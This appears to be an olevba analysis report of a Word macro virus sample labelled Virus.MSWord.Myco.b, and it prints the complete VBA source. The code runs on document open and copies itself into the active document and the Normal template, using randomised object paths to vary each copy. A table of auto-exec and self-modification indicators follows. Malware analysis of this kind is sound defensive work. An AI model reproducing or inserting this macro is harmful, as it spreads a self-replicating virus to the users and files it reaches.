olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myco.b-d00e06b92edeca59a4d323538e4a3cce5271534f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myco.b-d00e06b92edeca59a4d323538e4a3cce5271534f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim A(1 To 3) As String
Dim B(1 To 3) As String
Dim C(1 To 3) As String
A(1) = "Word.ActiveDocument"
A(2) = "Application.ActiveDocument"
A(3) = "Word.Application.ActiveDocument"
B(1) = "Word.NormalTemplate"
B(2) = "Application.NormalTemplate"
B(3) = "Word.Application.NormalTemplate"
C(1) = ".VBProject.VBComponents(1)"
C(2) = ".VBProject.VBComponents.Item(1)"
C(3) = ".VBProject.VBComponents.Item(""ThisDocument"")"
Host = "MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 18) & vbCrLf & Host & vbCrLf & ActiveCode1 & vbCrLf & ActiveCode2 & vbCrLf & NormalCode1 & vbCrLf & NormalCode2 & vbCrLf & ""End Sub"""
ActiveCode1 = A(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.DeleteLines 1, " & A(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.CountOfLines"
ActiveCode2 = A(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.AddFromString MyCode"
NormalCode1 = B(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.DeleteLines 1, " & B(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.CountOfLines"
NormalCode2 = B(Int((Rnd * 2) + 1)) & C(Int((Rnd * 2) + 1)) & ".CodeModule.AddFromString MyCode"
MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 18) & vbCrLf & Host & vbCrLf & ActiveCode1 & vbCrLf & ActiveCode2 & vbCrLf & NormalCode1 & vbCrLf & NormalCode2 & vbCrLf & "End Sub"
Word.ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Application.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Word.ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString MyCode
Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Application.NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString MyCode
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

